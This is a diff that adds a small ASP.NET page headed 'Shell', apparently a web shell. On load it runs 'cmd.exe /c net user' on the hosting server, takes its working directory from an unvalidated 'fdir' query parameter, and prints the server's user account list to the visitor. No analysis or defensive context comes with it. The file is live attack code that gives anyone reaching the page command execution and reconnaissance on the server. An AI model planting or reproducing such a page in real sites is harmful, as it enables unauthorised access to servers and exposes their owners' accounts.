@@ -1,0 +1,40 @@
+<%@ Page Language="C#" EnableViewState="false" %>
+<%@ Import Namespace="System.Web.UI.WebControls" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+
+<%
+  string outstr = "";
+  
+  string dir = Page.MapPath(".") + "/";
+  if (Request.QueryString["fdir"] != null)
+    dir = Request.QueryString["fdir"] + "/";
+  dir = dir.Replace("\\", "/");
+  dir = dir.Replace("//", "/");
+  
+  Process p = new Process();
+    p.StartInfo.CreateNoWindow = true;
+    p.StartInfo.FileName = "cmd.exe";
+    p.StartInfo.Arguments = "/c net user";
+    p.StartInfo.UseShellExecute = false;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.StartInfo.RedirectStandardError = true;
+    p.StartInfo.WorkingDirectory = dir;
+    p.Start();
+
+    lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+%>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head>
+</head>
+<body><form id="form1" runat="server">
+    <table style="width: 100%; border-width: 0px; padding: 5px;">
+    <tr>
+      <td style="width: 50%; vertical-align: top;">
+        <h2>Shell</h2>        
+        <pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
+      </td></tr></form>
+	  </body></html>
